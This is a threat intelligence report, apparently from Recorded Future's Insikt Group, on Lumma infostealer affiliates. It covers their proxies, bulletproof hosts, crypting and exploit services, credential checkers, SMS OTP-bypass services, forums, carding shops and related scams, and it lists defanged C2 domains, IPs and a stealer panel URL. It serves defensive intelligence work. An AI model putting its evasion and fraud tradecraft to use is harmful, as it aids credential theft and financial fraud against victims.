        <p>Looking ahead, Insikt Group anticipates that the MaaS Lumma and its affiliate network will remain active, having long been a frontrunner in the cybercriminal ecosystem due to its technical sophistication, rapid adoption of new techniques, and demonstrated resilience, as evidenced by its ability to reestablish infrastructure within days of a major law enforcement takedown. While the long-term impact of such operations on Lumma’s MaaS affiliate network remains uncertain, there has been no indication of affiliates abandoning the platform or of viable alternatives emerging. Ultimately, Lumma and its affiliates exemplify how modern cybercriminal operations operate as decentralized networks, where even effective disruptions often yield only short-term setbacks. Achieving sustained mitigation will require persistent law enforcement pressure and focused intelligence efforts to monitor and counter the evolving tactics of individual affiliates.</p>
        <h2>Key Findings</h2>
        <ul>
          <li>Insikt Group uncovered previously unreported tools used by Lumma affiliates, including a cracked email credential validation tool circulated on underground forums and a phishing page generator tied to another actor active across multiple forums.</li>
          <li>Lumma affiliates were observed running multiple scams in parallel, some enabled by their use of Lumma, such as using stolen logs for rental fraud. In addition, several affiliates appeared to use multiple infostealers simultaneously, including Vidar, Stealc, and Meduza Stealer, to maximize success rates and mitigate disruptions from detection or law enforcement action.</li>
          <li>Lumma affiliates heavily rely on underground and specialized carding forums as essential operational hubs. They leverage these platforms to recruit collaborators, obtain critical resources such as crypting services and privacy-enhancing services, and efficiently monetize stolen credentials, financial data, and infostealer logs through built-in black markets, fraud tools, and community-backed support networks.</li>
        </ul>
        <h2>Background</h2>
        <p>Lumma, sometimes referred to as LummaC2, <a href="https://go.recordedfuture.com/hubfs/reports/cta-2025-0228.pdf">was</a> the most widespread infostealer in 2024 based on Recorded Future’s malicious infrastructure analysis, and despite facing law enforcement actions in May 2025, it continues to pose a significant threat, actively exfiltrating data from individuals, organizations, and governments. While infostealers like Lumma are now a well-known menace in the cybersecurity landscape, many questions remain: What does a typical day look like for an infostealer affiliate? How do they operate, who are they, what other activities are they involved in, where are they based, and how are the stolen logs ultimately used?</p>
        <p>Over the past twelve months (the second half of 2024 through the first half of 2025), Insikt Group has conducted a comprehensive investigation into a broad network of Lumma affiliates operating across multiple countries. Drawing on a wide range of intelligence sources, including two affiliate guidance manuals (see <strong>Figure 1</strong>), Recorded Future <a href="https://www.recordedfuture.com/products/threat-intelligence/malware-intelligence">Malware Intelligence</a>, Recorded Future <a href="https://www.recordedfuture.com/products/identity-intelligence">Identity Intelligence</a> malware logs, and other proprietary investigative methods, Insikt Group has uncovered detailed, unique insights into these affiliates' operations and tradecraft.</p>

        <p>The findings are presented in two sections: The first examines the affiliates’ technical ecosystems, detailing their use of info-stealing techniques, favored tools and services, and recurring operational behaviors. The second explores how Lumma affiliates are embedded in the broader underground economy. It analyzes their participation in cybercrime forums, use of additional infostealer malware families, and involvement in other types of online fraud and scams.</p>

        <h3>Operational Infrastructure and Tradecraft</h3>
        <h4>Privacy Enhancing Services</h4>
        <h5>Proxy Services</h5>
        <p>Insikt Group observed multiple Lumma affiliates leveraging various proxy services, detailed in <strong>Table 1</strong>; Pia Proxy was the most frequently used service. Proxies can be used for legitimate purposes such as privacy and research, but they are frequently exploited by cybercriminals to mask identities, avoid detection, and bypass restrictions. Some services, such as ASocks and the malware-based FACELESS, among others, have been openly marketed on cybercrime forums; ASocks has been <a href="https://www.humansecurity.com/learn/blog/satori-threat-intelligence-alert-proxylib-and-lumiapps-transform-mobile-devices-into-proxy-nodes">linked</a> to fake VPNs that convert Android devices into proxies, while FACELESS <a href="https://krebsonsecurity.com/2023/04/giving-a-face-to-the-malware-proxy-service-faceless/">leverages</a> malware to hijack IoT devices for the same purpose. Insikt Group evaluated the proxy services by type based on several criteria, including whether they were promoted on cybercriminal forums.</p>

        <p><strong><em>Table 1</em></strong><em>: Proxy services used by Lumma affiliates (Source: Recorded Future)</em></p>
        <p>Of note, in early 2024, Lumma began collaborating with the GhostSocks team, a residential proxy plugin, enabling affiliates to create SOCKS5 proxies from infected bots, as announced via Lumma’s official channel (see <strong>Figure 2</strong>) (<a href="https://x.com/g0njxa/status/1754630820650696875">1</a>, <a href="https://infrawatch.app/blog/ghostsocks-lummas-partner-in-proxy">2</a>). By 2025, Lumma <a href="https://spycloud.com/blog/on-the-hunt-for-ghostsocks/">expanded</a> this offering, providing affiliates with backconnect proxy access to compromised machines. This <a href="https://spycloud.com/blog/on-the-hunt-for-ghostsocks/">allowed</a> threat actors to conduct attacks that appeared to originate from the victim’s device, significantly improving their ability to bypass access controls such as Google’s cookie-based protections, a mechanism Lumma routinely exploits to refresh expired tokens.</p>

        <p>In at least one instance, Insikt Group identified a Lumma affiliate linked to build ID vcs1q5 — and known as “blackowl23” on cybercriminal forums such as Cracked, Nulled, Sinisterly, Eternia, and Cracking during 2022 and 2023 — using IP addresses associated with the Ngioweb botnet. This botnet has been previously <a href="https://blog.lumen.com/one-sock-fits-all-the-use-and-abuse-of-the-nsocks-botnet/">linked</a> to the cybercriminal proxy service NSOCKS, as well as others such as VN5Socks and Shopsocks5. The associated IP addresses, likely no longer part of the botnet due to public reporting and other mitigating actions, are listed in <strong>Appendix A</strong>. Many of the IP addresses had been previously validated by Insikt Group and <a href="https://www.trendmicro.com/en_us/research/24/k/water-barghest.html">reported</a> on publicly.</p>
        <h5>VPN Services</h5>
        <p>According to research conducted by Insikt Group, all analyzed Lumma affiliates were using VPN services in some capacity, with many using multiple providers. A selection of the VPN services observed in use by these affiliates is presented in <strong>Table 2</strong>.</p>

        <h5>Anti-Detection and Multi-Account Browsers</h5>
        <p>Lumma affiliates frequently rely on specialized privacy-focused and anti-detect browsers (see <strong>Table 3</strong>) to evade identification, bypass security measures, and manage multiple fraudulent accounts simultaneously. These tools allow the threat actors to maintain operational security (OPSEC) by obscuring their true identity, location, and digital fingerprints. Among the most prevalent browsers used by Lumma affiliates is Dolphin, recognized widely as one of the best anti-detect browsers tailored explicitly for managing multiple threat actor-controlled accounts without detection. Dolphin’s capabilities are mirrored by Adspower, Hidemyacc, and Kameleo, which similarly facilitate seamless multi-account operations, thereby enhancing operational efficiency and anonymity. Octo Browser, another prominent tool among cybercriminals, provides advanced fingerprint masking, further complicating efforts by law enforcement and threat intelligence professionals to track threat activities to their source.</p>
        <p>The Brave browser, while designed primarily for enhanced user privacy rather than outright anti-detection, appeals to threat actors due to its robust built-in security and privacy features, such as aggressive ad and tracker blocking. Although less explicitly tailored for multi-account management, its privacy-focused approach provides valuable baseline protection for threat actors seeking to maintain anonymity online.</p>

        <h4>Hosting Providers</h4>
        <p>While Lumma supplies core C2 infrastructure through its MaaS offering, its affiliates rely on separate hosting providers likely aimed at supporting phishing efforts, payload deployment, and other malicious activity. Many of the hosting providers linked to the analyzed Lumma affiliates appear legitimate, but some stood out for seemingly catering directly to cybercriminals and enabling malicious activity, including AnonRDP, Bulletproof Hosting, and Hostcay, which have been used by the Lumma affiliate linked to the build ID re0gvc.</p>
        <h5>AnonRDP</h5>
        <p>AnonRDP (<em>anonrdp[.]com</em>) is a self-proclaimed bulletproof hosting provider specializing in anonymous VPS and RDP services, with a strong focus on privacy and resistance to takedown (see <strong>Figure 3</strong>). It requires no identity verification and accepts only cryptocurrency payments, such as Bitcoin and Monero, <a href="https://decodecybercrime.com/from-mauritius-to-the-deep-web-the-anonrdp-com-expose/">processed</a> through the payment service provider NOWPayments and, allegedly, the cryptocurrency exchange ChangeNOW. Its tolerance of malicious activity is further <a href="https://decodecybercrime.com/from-mauritius-to-the-deep-web-the-anonrdp-com-expose/">confirmed</a> by advertisements on deep web forums such as BreachForums, Hack Forums, Nulled, and Patched. As illustrated in <strong>Figure 3</strong>, the website explicitly acknowledges supporting activities such as hosting, distributing, or controlling botnets, remote access trojans (RATs), phishing, fraudulent content, spam, and more. According to public reports, AnonRDP is <a href="https://decodecybercrime.com/from-mauritius-to-the-deep-web-the-anonrdp-com-expose/">operated</a> by Yashvir Keshave, an individual with a known history of involvement in the underground ecosystem, including config (configuration) creation, cracking tools, and digital account trading.</p>

        </div>
        <p>Following the arrest of Yuri Meruzhanovich Bozoyan, co-founder and CEO of Aeza Group LLC, on April 1, 2025, Insikt Group observed that AnonRDP had attempted to poach Aeza customers with 50% discounts. The extent of the poaching’s success remains uncertain.</p>
        <h5><strong>Bulletproof Hosting</strong></h5>
        <p>Similarly, Bulletproof Hosting (<em>bulletproofhosting[.]org</em>) markets itself as an offshore, privacy-centric hosting provider that offers anonymous, takedown-resistant infrastructure, accepts cryptocurrency payments, and has no ID requirements (see <strong>Figure 4</strong>). The website promotes lenient content policies, explicitly permitting adult material, piracy, gambling, and other content typically banned by conventional hosts. It claims to defend against DMCA notices, abuse complaints, and Spamhaus listings, using techniques like FastFlux and hosting in offshore or hardened facilities with minimal regulatory oversight. With 24/7 support managed by self-described “cyber-tech experts,” the platform is positioned as a resilient service catering to users seeking both anonymity and consistent uptime, which are often appealing to threat actors and controversial content operators.</p>

        </div>
        <h5>HostCay</h5>
        <p>HostCay (<em>hostcay[.]com</em>) is a privacy-focused, offshore hosting provider founded in 2023 and operated by Netacel Inc., an international business company (IBC) registered in Seychelles. HostCay specializes in hosting services that prioritize freedom of speech, whistleblower support, and resistance to content takedown requests (see <strong>Figure 5</strong>). It is known for its support for anonymous crypto payments, no ID requirements, and strong free speech protections.</p>

          </div>
        </div>
        <p>Lumma affiliates have also been observed leveraging numerous legitimate hosting providers and services, including the file hosting platform MEGA (<em>mega[.]nz</em>), the file and text sharing service Temp[.]sh (<em>temp[.]sh</em>), and the image hosting service ImgBB (<em>imgbb[.]com</em>). They have also made use of various URL shortening services such as <em>shorturl[.]at</em> and <em>free-url-shortener[.]rb[.]gy</em>.</p>
        <h4>Exploit and Crypting Services</h4>
        <p>One notable service supporting Lumma operations is run by an actor known as “@cryptexxx.” Rather than being a Lumma affiliate directly, @cryptexxx is the operator of a crypting and exploit service known as Hector (advertised via the domain <em>hector[.]su</em>) that caters to malware distributors, among others (see <strong>Figure 6</strong>). The HTML content of <em>hector[.]su</em> includes meta keywords — such as <code>crypt</code>,<code> exe</code>,<code> exploits</code>,<code> chrome</code>,<code> bypass</code>,<code> lnk</code>,<code> url</code>,<code> xls</code>,<code> xll</code>,<code> doc</code>,<code> docx</code>,<code> pdf</code>,<code> builder</code>,<code> macro</code>, or<code> popup</code> — indicating a broad toolkit for creating malicious payloads across various file formats (from Office macros to Chrome exploits). Forum discussions corroborate that this service provides fully undetectable (FUD) droppers and document exploits for delivering malware. For example, one hacker forum user explicitly directs others to “see URL exploit on <em>hector[.]su</em>” as a resource for a Gmail-attachable, FUD exploit. Such exploits often take the form of weaponized Office files, like malicious Excel add-in files (<code>.XLL</code>) or macro-laced documents, which can embed the Lumma payload and are designed to slip past email scanners and antivirus protections.</p>
        <p>Recent evidence illustrates how these tools are used in practice. In mid-2025, an underground vendor advertised an updated Office exploit that is “up to date, works in 2025 and attachable on Gmail, plus FUD,” explicitly boasting that it can bypass Gmail’s filters. The same offering also highlights a Windows Defender runtime bypass, with an AV scan report showing 0/26 detections. This means a Lumma affiliate could generate a trojanized file (such as an Excel <code>.xll</code> file or a malicious shortcut/URL file) that delivers the stealer while evading both email gateway scanning and endpoint antivirus protections.</p>
        <p>By leveraging @cryptexxx’s crypting service and exploit builder, the affiliate essentially outsources the difficult aspects of stealth and delivery. It is a clear example of the cooperative nature of LummaC2 operations: the malware developer provides the infostealer malware, the service operator (@cryptexxx) supplies an obfuscation and exploit toolkit, and the affiliate uses these tools to distribute the payload to victims.</p>

        <h4>Email-Linked Services and Tools</h4>
        <p>Insikt Group observed multiple Lumma affiliates using a range of email and spam-related services, including a credential validation tool known as “EMAIL SOFTWARE 1.4.0.9 cracked by Maksim” and a phishing page creation tool known as “DONUSSEF”, both of which have likely been deployed in at least one confirmed case.</p>
        <h5>EMAIL SOFTWARE 1.4.0.9 cracked by Maksim</h5>
        <p>EMAIL SOFTWARE 1.4.0.9 cracked by Maksim is a cracked version of a Windows .NET-based email credential verification tool (see <strong>Figure 7</strong>). It is designed to validate email and password combinations against mail servers using protocols like IMAP and POP3. Users can input large lists of email credentials (often referred to as "combo lists") to check which combinations are valid. The tool also <a href="https://pro.urlscan.io/result/01980f1a-e26f-772c-acd5-5462d5591743">allows</a> users to search for specific keywords within email content. The tool is distributed as a password-protected <code>.rar</code> archive on various hacking and cracking forums (such as DemonForums or XReactor), with users reporting prices of up to $250 on underground marketplaces.</p>

        </div>
        <p>Insikt Group assesses that the Lumma affiliate blackowl23 has used or continues to use the tool to validate stolen credentials, which are then leveraged in the follow-on real estate scam detailed in the section <a href="#blackowl23s-involvement-in-real-estate-scam">blackowl23’s Involvement in Real Estate Scam</a>, among other scams. Based on identified configurations, it is possible that the affiliate has customized the tool.</p>
        <h5>DONUSSEF</h5>
        <p>Insikt Group identified another tool, known as “DONUSSEF”, which was demonstrated in a publicly accessible video hosted on Google Drive at the time of analysis (see <strong>Figure 9</strong>). Believed to be used by blackowl23, the tool is designed to generate phishing pages via the command line using AI. It prompts the user to input URLs, a subject line, and a brief description of the intended phishing content, and then produces an HTML file as output.</p>

          </div>
        </div>
        <p>The full range of phishing pages the tool can generate remains unclear, as Insikt Group was unable to independently test it. In the demo, it was shown creating only PayPal phishing pages (see <strong>Figure 10</strong>). Due to the unavailability of the actual HTML pages, Insikt Group was unable to assess their effectiveness or determine whether they have appeared in any known campaigns.</p>

        </div>
        <p>Through further investigation, Insikt Group <a href="https://www.youtube.com/@donussef">identified</a> a YouTube channel likely associated with the suspected creator of DONUSSEF. The actor used the channel to demonstrate at least two additional tools: one <a href="https://www.youtube.com/watch?v=eKGYS5gqOI4">marketed</a> as an email sender with a 100% inbox delivery rate, and another for SMS spamming (<a href="https://www.youtube.com/watch?v=9UrQ8DgwDBM">referred</a> to as “<code>ULTRA-checker.py</code>” in the video). Both videos were uploaded on December 18, 2022, from a device using French-language settings. In one of the demo videos, the actor used and accessed two email accounts, <em>ussefescobar@seznam[.]cz</em> and <em>ussefakkar@outlook[.]com</em>, which are believed to be linked to the actor.</p>
        <p>The <code>ULTRA-checker.py</code> tool includes references to two Telegram channels: @donussef and @rdpvendor. At least one of these accounts appears to be active in Telegram communities associated with spam-related tools (see <strong>Figure 11</strong>). Insikt Group found no additional links between the suspected creator of DONUSSEF and blackowl23.</p>

        </div>
        <h5>Other Email Sender and Lead Generation Services</h5>
        <p>Insikt Group identified several other, often legitimate email-related services used by Lumma affiliates for multiple purposes, including Joz Data (<em>jozdata[.]com</em>), Mailchimp (<em>mailchimp[.]com</em>), Spamir (<em>spamir[.]fr</em>), and Mandrill (<em>mandrillapp[.]com</em>), among others. Joz Data provides validated, segmented email lists for marketing and lead generation. Mailchimp is a legitimate platform for designing and managing email campaigns. Spamir <a href="https://pro.urlscan.io/result/55f27eb5-b9fa-4c56-aab1-93cad0379dbb">offers</a> tools for bulk email and SMS delivery, often linked to spam or phishing activity despite being presented as a testing toolkit. Mandrill, a paid add-on to Mailchimp, is a transactional email API used to send one-to-one, event-triggered messages such as password resets and order confirmations via SMTP or API.</p>
        <h4>AVCheck and Alternatives</h4>
        <p>Like many threat actors deploying malware or related infrastructure, Lumma affiliates actively seek tools to test detection beyond standard sandbox environments. Over the past twelve months, Insikt Group observed multiple affiliates using at least two such services: AVCheck (<em>avcheck[.]net</em>), which was <a href="https://therecord.media/international-operation-takes-down-cryptor">seized</a> by law enforcement in May 2025; and, more recently, KleenScan (<em>kleenscan[.]com</em>). There were also signs that at least one affiliate used <em>avscan[.]net</em>, although its presence and nature could not be confirmed at the time of analysis, as the domain <a href="https://urlscan.io/result/019811bc-d4b7-7636-b6b9-298b027cd6d4">appeared</a> to be listed for sale.</p>
        <p>KleenScan is an alternative malware-scanning service frequently used by and <a href="https://www.esentire.com/blog/operation-endgame-disrupts-avcheck-forces-threat-actors-to-seek-alternatives">marketed</a> to cybercriminals to test malicious files, URLs, and domains against multiple antivirus engines (see <strong>Figure 12</strong>). It offers a user interface, API, and command-line client, and even a Telegram bot (@kleenscanofficialbot) for uploads and real-time or runtime scans, all while explicitly promising a "No Distribution" policy so that submitted samples will not be shared with antivirus vendors. Although Insikt Group observed Lumma affiliates using KleenScan prior to AVCheck’s seizure in May 2025, public reporting <a href="https://www.esentire.com/blog/operation-endgame-disrupts-avcheck-forces-threat-actors-to-seek-alternatives">indicates</a> that cybercriminals have increasingly turned to platforms like KleenScan as an alternative due to the seizure. Notably, KleenScan advertises <em>hector[.]su</em> (see <strong>Figure 12</strong>), an exploit broker further detailed in the section <a href="#exploit-and-crypting-services">Exploit and Crypting Services</a>.</p>

          </div>
        </div>
        <h4>Phone and SMS Services</h4>
        <p>Lumma affiliates heavily abuse virtual phone and SMS services (see <strong>Table 4</strong>) such as OnlineSim, SMS-Activate, and Zadarma. These platforms provide throwaway phone numbers for SMS or voice verification, which the threat actors use to bypass OTP-based security and create fake accounts without using personal identifiers. Lumma affiliates can automatically receive 2FA codes or activation PINs on virtual numbers, allowing them to register malware distribution sites, cloud drives, or messaging accounts without exposing their real phone lines. This identity obfuscation is crucial in the Lumma ecosystem, as it frustrates attribution and takedown efforts by making infrastructure ownership seem transient.</p>
        <p>In practice, using these services for OTP bypass and fake account generation helps Lumma crews widen their attack surface. Disposable SMS numbers let attackers circumvent SMS-based two-factor authentication by redirecting one-time passcodes to attacker-controlled inboxes. This means that even if a stolen account is protected by SMS 2FA, Lumma affiliates can try to reroute the OTP to a virtual number they control, effectively nullifying the protection. Services like Zadarma (a VoIP provider) further enable criminals to receive calls or texts on virtual lines, or even perform spoofed voice calls as part of OTP interception bots and vishing schemes. Within the Lumma affiliate program, guides and community chatter encourage the use of these tools for operational security, from registering throwaway email and Telegram accounts to setting up C2 panels or scam payment accounts.</p>

        <p><strong><em>Table 4</em></strong><em>: Phone and SMS-linked services used by Lumma affiliates (Source: Recorded Future)</em></p>
        <h4>Messaging Platforms</h4>
        <p>Lumma affiliates integrate multiple secure messaging and information-sharing tools into their daily workflows to enhance operational security, maintain anonymity, and minimize digital footprints. Affiliates commonly use uTox, a decentralized peer-to-peer messaging client employing end-to-end encryption via the Tox protocol. This tool facilitates persistent, secure communications, supporting text, voice, and video messaging, and is frequently combined with Tor proxies to conceal affiliate identities and avoid central server dependencies.</p>
        <p>Mobile affiliates within the Lumma ecosystem prefer secure XMPP-based Android applications like Xabber and <em>c0nnect[.]pro</em>. Both apps offer encrypted communications via off-the-record encryption, multi-account management, and compatibility with private, controlled XMPP servers, making them ideal for discrete coordination while on the move. Affiliates often configure these applications to run in tandem with Tor proxies, further obfuscating metadata and reducing digital exposure.</p>
        <p>For scenarios requiring transmission of ephemeral, sensitive information, such as credentials, passwords, or instructions, Lumma affiliates frequently rely on Privnote, a web-based service that generates encrypted notes that self-destruct after being read once. This capability significantly reduces the affiliate’s potential forensic footprint by leaving no persistent records and enables secure, rapid exchanges of operational details.</p>
        <p>Collectively, these tools form a layered communication architecture employed by Lumma affiliates, effectively balancing persistent communications, mobile flexibility, and ephemeral secure exchanges to minimize risks and enhance stealth.</p>
        <h4>Social Media Optimization</h4>
        <p>In at least one case, Insikt Group observed a Lumma affiliate leveraging the service Bosslike (<em>bosslike[.]ru</em>), which claims to offer free and rapid boosts for likes on platforms such as Instagram, VK, and TikTok (see <strong>Figure 13</strong>), likely in support of scam-related activities.</p>

        <h3>Affiliates’ Embedding in the Cybercriminal Ecosystem</h3>
        <h4>Forum Involvement</h4>
        <p>Lumma’s affiliate ecosystem thrives on underground forums that act as hubs for collaboration, resources, and marketplaces. Russian-language cybercrime forums like XSS and Exploit serve as launchpads for Lumma’s MaaS, and they are where the stealer was initially <a href="https://www.cloudflare.com/threat-intelligence/research/report/cloudflare-participates-in-joint-operation-to-disrupt-lumma-stealer/#:~:text=Lumma%20Stealer%20was%20first%20observed,to%20the%20current%20disruption%20effort">advertised</a> and vetted by the community. These forums attract technically adept threat actors and lend credibility to new malware offerings through reputation systems and moderator oversight. Affiliates frequent them not only to obtain Lumma builds but also to engage with trusted escrow and arbitration services, ensuring safer transactions when purchasing tools or settling disputes with partners. The established trust on forums like Exploit and XSS provides a reliable environment for affiliates to do business, from renting servers to resolving conflicts, under the watch of experienced moderators.</p>

          </div>
        </div>
        <p>At the same time, mass-market cybercrime communities such as LolzTeam (<em>zelenka[.]guru</em>) have become a hotbed for <a href="https://www.cybercrimediaries.com/post/russian-language-cybercriminal-forums-analyzing-the-most-active-and-renowned-communities#:~:text=Our%20observations%20lead%20us%20to,and%20offering%20to%20educate%20beginners">recruiting</a> and training the foot soldiers of Lumma’s operations. These more accessible forums host dedicated sections for “traffers,” threat actors who specialize in spreading infostealer malware, and are actively used to assemble affiliate teams and educate newcomers. On LolzTeam, for example, seasoned criminals advertise infostealer affiliate programs that provide novices with everything needed to start distributing malware. In <a href="https://g0njxa.medium.com/profiling-traffic-cerberus-ex-amnesia-3758faba4385">one case</a>, a team on LolzTeam offered free crypted Lumma builds and even SEO support to new recruits, taking a percentage of profits from stolen cryptocurrency assets. This low barrier to entry, combined with forum-posted tutorials on fraud techniques and operational security, turns platforms like LolzTeam into a workforce pool for infostealer distribution. The forums’ community-driven vetting, including rules against targeting certain regions and public feedback on schemes, further helps affiliates learn effective and “acceptable” tactics. Common fraud methodologies are frequently discussed and popularized on these boards, giving Lumma affiliates insight into monetization tricks and victim manipulation strategies.</p>
        <p>Perhaps most critically, these underground forums provide ready-made marketplaces and services that Lumma affiliates leverage to monetize stolen data and optimize their campaigns. Infostealer logs are in high demand, and forums link affiliates to bustling marketplaces where this data is bought and sold. Russian Market (<em>rm1[.]to</em>), for example, is an automated shop accessible via forum circles that has been <a href="https://reliaquest.com/blog/infostealer-pipeline-stolen-credential-attacks-russian-marketplace/?utm_source=twitter.com/thewebvy#:~:text=credentials%20on%20the%20notorious%20automated,vending%20cart%20site%20Russian%20Market">described</a> as “the Amazon of stolen credentials” for its massive inventory and one-click purchase convenience. By late 2024, Lumma had become the dominant source of credentials on Russian Market, <a href="https://reliaquest.com/blog/infostealer-pipeline-stolen-credential-attacks-russian-marketplace/?utm_source=twitter.com/thewebvy#:~:text=credentials%20on%20the%20notorious%20automated,vending%20cart%20site%20Russian%20Market">accounting</a> for roughly 92% of stolen log listings, underscoring how extensively Lumma affiliates dump their haul on such platforms for profit. Other venues like LolzTeam’s own marketplace and <em>xleet[.]pw</em> similarly include sections for infostealer logs, compromised accounts, and digital goods, allowing affiliates to quickly sell data from Lumma infections to the highest bidder. Beyond data sales, forum marketplaces connect Lumma affiliates to initial access brokers and financial fraud services that help convert stolen information into cash. Affiliates can find buyers for enterprise login credentials or enlist money laundering and cash-out services advertised across these forums.</p>
        <p>Underground forums double as one-stop shops for the technical and operational support that Lumma affiliates need. Dedicated <a href="https://medium.com/s2wblog/lumma-stealer-targets-youtubers-via-spear-phishing-email-ade740d486f7">threads</a> run by the Lumma developers or peer community members offer technical assistance, update announcements, and troubleshooting advice in real time. This means an affiliate can turn to forum communities for help with builder configuration, antivirus evasion tips, or to share intelligence on law enforcement takedowns. The forums also host a range of malware-adjacent services crucial to running stealthy campaigns. Providers of bulletproof hosting, VPNs, and traffic distribution congregate on all major forums. The same service providers frequently advertise on multiple sites, which makes it easy for affiliates to obtain resilient servers and web domains to host Lumma malware. Crypting services are equally accessible; for instance, the popular Cassandra crypter and others are promoted in forum marketplaces, enabling affiliates to continuously encrypt and repackage Lumma payloads to evade antivirus detection.</p>
        <p>There is a rich ecosystem of offerings, such as exploit kits, fake document templates, spambot rentals, and credential checkers, which affiliates can source from these communities to enhance their operations. Together, these forums provide Lumma affiliates with a comprehensive suite of tools that have been vetted by the community. This practical and operational value is why Lumma’s affiliate network remains deeply embedded in underground forums: they provide not only the means to deploy and hide the malware, but also the mechanisms to cash in on its outputs, all within a semi-structured community that enforces trust among thieves.</p>
        <h4>Carding Shops</h4>
        <p>Lumma Stealer affiliates turn to specialized carding shops like <em>b1ackstash[.]cc</em>, <em>stashpatrick[.]io</em>, BriansClub (see <strong>Figure 15</strong>) (<em>bclub[.]cm</em> and <em>briansclub[.]cm</em>), and <em>binsoficial666[.]activo[.]mx</em> to efficiently monetize the financial data they’ve stolen. Insikt Group notes that these sources vary widely in credibility; shops like BriansClub are considered authoritative within the payment fraud ecosystem, while <em>binsoficial666[.]activo[.]mx</em> has a very poor reputation. Unlike general cybercrime boards, carding websites are dedicated to trading payment data and attract a built-in customer base of fraudsters looking for credit card numbers, bank logins, and personal info. Lumma affiliates capitalize on this demand by selling freshly obtained card records and “fullz” in bulk, often earning a percentage for each sale through the forum’s escrow or shop system. In essence, carding platforms let Lumma affiliates quickly turn stolen card data into profit, with high-volume outlets like BriansClub historically trafficking millions of compromised cards supplied by malware affiliates.</p>

        <p>Beyond sales, carding forums offer operational support for fraud that broader hacking forums do not. Lumma affiliates frequent these communities to learn and collaborate on card-not-present (CNP) fraud using stolen card credentials to buy goods or launder money online. The forums host vetted tutorials for abusing e-commerce sites and payment processors, helping thieves bypass anti-fraud measures. Members also advertise criminal services such as providing “drop” addresses (safe delivery points for goods bought with stolen cards) or converting illicit purchases into cash. Additionally, these forums supply validation tools and services critical to fraud operations. Lumma affiliates can purchase or access credit card checkers that automatically test which cards from their stealer logs remain valid and have credit available, ensuring they only spend time on live cards. They might also acquire Bank Identification Number (BIN) lists and other utilities, using the community’s pooled resources to maximize successful transactions. Carding sites enable Lumma affiliates to offload infostealer loot in bulk, complementing sales on broader crime forums. A single Lumma infection yields an expansive log of credentials, cookies, system data, and often multiple financial accounts; parsing and individually selling each asset can be labor-intensive. Carding marketplaces or associated breach data shops let affiliates resell entire stealer logs or specific datasets to other criminals who specialize in exploiting them. For example, high-value logs from Lumma, containing not just cards but bank account passwords or cryptocurrency wallet keys, are often posted on underground markets or offered via automated bot vendors shortly after exfiltration. This practice allows Lumma affiliates to monetize stolen information at scale: they can quickly sell bundles of fresh logs to brokers or fraud rings while focusing their own efforts on new infections. In tandem with general hacking forums, these carding forums provide the ecosystem for cashing out Lumma’s results. They offer a one-stop underground economy where affiliates convert stolen data into money through direct sales of CVVs and “fullz,” the provision of guidance and tools for fraudulent transactions, and the bulk resale of stolen logs. This significantly enhances both the profitability and practicality of Lumma operations.</p>
        <h4>Use of Additional Infostealers</h4>
        <p>Insikt Group observed several Lumma affiliates leveraging other infostealers alongside Lumma.</p>
        <h5>Meduza Stealer, Vidar, and CraxsRAT Used by Likely Mexico-Based Lumma Affiliate</h5>
        <p>The affiliate linked to Lumma build ID re0gvc, a likely Mexico-based threat actor operating under multiple aliases across various forums, was observed using Meduza Stealer infrastructure tied to IP address <em>195[.]133[.]18[.]15</em>. Like Lumma, Meduza Stealer is a Windows-based MaaS infostealer, designed to extract credentials, browser data, and crypto wallets while evading detection through anti-analysis and geo-filtering techniques.</p>

          </div>
        </div>
        <p>Insikt Group also identified high-confidence indicators that the same threat actor used Vidar, a Windows-based infostealer, along with medium-confidence evidence suggesting the use of CraxsRAT, an Android-based RAT, based on Telegram profile images likely tied to the affiliate (see <strong>Figure 17</strong>). While this indicates this affiliate may have also targeted mobile devices, Insikt Group found no associated samples, infrastructure, or campaigns to confirm this activity.</p>

        </div>
        <h5>Stealc Used by Lumma Affiliate suffergrime</h5>
        <p>Another affiliate linked to Lumma build IDs test222 and eLMNFu, known as “suffergrime” on various forums and operating under multiple other aliases, including duckfuck, cryptplease, ultracool2201, borodach, and dedo4ek, appears to have used StealC alongside Lumma. Stealc is a modular, evasive information stealer written in C and distributed as an MaaS. More specifically, suffergrime has been observed interacting with the Stealc management panel on the URL <em>hxxp://94[.]232[.]249[.]208/6a6fe9d70500fe64/main.php</em>. Insikt Group assesses that the affiliate is likely a Spanish speaker, with indications suggesting a possible origin in South America.</p>
        <h5>worldmix10k’s Interest in Wallet and Vilsa Stealer</h5>
        <p>In addition to the cases above, Insikt Group observed a Lumma affiliate associated with build ID 1dacrp and likely known as “worldmix10k” expressing interest in two additional stealers: a “Wallet Stealer” previously hosted on a GitHub repository named “poopybuthoop”, and Vilsa Stealer, an infostealer that had been publicly <a href="https://www.cyfirma.com/research/vilsa-stealer/">reported</a> on earlier. Although the GitHub repository was no longer accessible at the time of analysis, a historical snapshot was preserved by Ecosyste.</p>

          </div>
        </div>
        <p>Notably, a search for the string “worldmix10k” led Insikt Group to a Lumma sample with the build ID “1dacRP--worldmix10k”, linked to the same affiliate. This sample used <em>techmindzs[.]live</em> and <em>earthsymphzony[.]today</em> as its C2 domains, as well as a SteamCommunity URL, <em>hxxps://steamcommunity[.]com/profiles/76561199822375128</em>, for dead drop resolving. Insikt Group could not identify the exact infection chains linked to the sample.</p>
        <h4>Involvement in Other Scams</h4>
        <p>Analysis of multiple Lumma affiliates over the last twelve months revealed that many are not only using multiple infostealers concurrently, as outlined in the section <a href="#use-of-additional-infostealers">Use of Additional Infostealers</a>, but are also likely involved in a variety of distinct scam operations. One of these scams, linked to the Lumma affiliate known as blackowl23, drew particular attention from Insikt Group and is explored in greater detail below.</p>
        <h5>blackowl23’s Involvement in Real Estate Scam</h5>
        <p>Insikt Group uncovered evidence indicating that blackowl23 has been involved in a real estate scam in which rental listings, likely both actor-created and compromised, on platforms like the German website WG-Gesucht were used to deceive victims into making payments before apartment viewings. As part of this scheme, blackowl23 has used the email addresses <em>immo-total[@]outlook[.]com</em> and <em>mwimport[@]outlook[.]de</em> (see <strong>Figure 19</strong>).</p>

          </div>
        </div>
